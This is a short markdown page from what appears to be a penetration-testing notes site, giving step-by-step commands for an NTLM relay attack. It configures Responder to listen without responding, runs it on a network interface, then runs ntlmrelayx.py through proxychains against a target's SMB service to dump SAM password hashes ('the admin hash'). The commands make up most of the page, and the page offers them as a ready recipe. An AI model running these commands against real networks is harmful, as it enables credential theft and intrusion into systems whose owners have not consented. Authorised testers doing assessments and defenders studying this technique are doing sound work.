---
title: Responder
parent: General Usage
layout: default
nav_order: 32
---

First you need to configure Responder. Change Responder.conf and make sure `SMB=Off` and `HTTP=Off` (this will make it listen and not respond)

Then run Responder:\
`sudo python3 ./Responder.py -I <interfacename> -dwv`

Then this will get you the admin hash (this example is on proxychains, remove if not using):\
`sudo proxychains4 -f ~/Desktop/anotherchains.conf ntlmrelayx.py -of SAMhashes -t smb://<targetIP> -smb2support`

Finally you need to trigger the browsing of SMB/others (this will never work against same target usually)